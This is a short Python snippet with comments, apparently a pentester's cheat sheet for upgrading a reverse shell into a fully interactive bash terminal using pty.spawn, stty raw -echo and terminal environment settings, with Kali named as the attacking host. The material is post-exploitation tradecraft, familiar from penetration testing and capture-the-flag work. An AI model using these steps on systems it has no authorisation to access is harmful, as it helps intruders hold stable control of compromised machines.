import pty

pty.spawn("/bin/bash")

# In reverse shell
#python -c 'import pty; pty.spawn("/bin/bash")'
#Ctrl-Z

# In Kali
#stty raw -echo
# fg

# In reverse shell
#reset
# export SHELL=bash
# export TERM=xterm-256color
# stty rows <num> columns <cols>